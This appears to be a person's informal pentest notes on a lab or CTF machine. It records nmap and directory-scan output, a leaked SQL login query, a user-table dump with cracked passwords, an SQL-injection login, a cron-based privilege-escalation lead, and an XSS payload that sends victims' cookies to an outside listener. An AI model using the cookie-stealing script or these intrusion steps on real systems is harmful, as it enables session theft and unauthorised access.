PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)



---
priority:

445:
http://10.114.186.150:445/management/
http://10.114.186.150:445/management/admin/login.php

admin                (Status: 301) [Size: 332] [--> http://10.114.186.150:445/management/admin/]
assets               (Status: 301) [Size: 333] [--> http://10.114.186.150:445/management/assets/]
build                (Status: 301) [Size: 332] [--> http://10.114.186.150:445/management/build/]
classes              (Status: 301) [Size: 334] [--> http://10.114.186.150:445/management/classes/]
database             (Status: 301) [Size: 335] [--> http://10.114.186.150:445/management/database/]
dist                 (Status: 301) [Size: 331] [--> http://10.114.186.150:445/management/dist/]
inc                  (Status: 301) [Size: 330] [--> http://10.114.186.150:445/management/inc/]
index.php            (Status: 200) [Size: 14506]
libs                 (Status: 301) [Size: 331] [--> http://10.114.186.150:445/management/libs/]
pages                (Status: 301) [Size: 332] [--> http://10.114.186.150:445/management/pages/]
plugins              (Status: 301) [Size: 334] [--> http://10.114.186.150:445/management/plugins/]
uploads              (Status: 301) [Size: 334] [--> http://10.114.186.150:445/management/uploads/]





80:
baits

22:

potential usernames: 
charity

[http://10.114.186.150:445/management/admin/](http://10.112.129.52:445/management/admin/login.php)

`{"status":"incorrect","last_qry":"SELECT * from users where username = 'a' and password = md5('a') "}`
looks like SQLi and i suck at that shit


DB dump

INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, `avatar`, `last_login`, `type`, `date_added`, `date_updated`) VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', 'uploads/1624240500_avatar.png', NULL, 1, '2021-01-20 14:02:37', '2021-06-21 09:55:07'),
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', 'uploads/1629336240_avatar.jpg', NULL, 2, '2021-08-19 09:24:25', NULL);

admin:admin123
jsmith:jsmith123

// this might be useful once i get shel , if i get shell //


USED SQL i to login, figure it out if you do it again

Found that you can use XSS 

<script>fetch('http://192.168.232.84:1111/?cookie=' + btoa(document.cookie));</script>



---
priv esc

once i gain plot_admin

* *     * * *   plot_admin /var/www/scripts/backup.sh
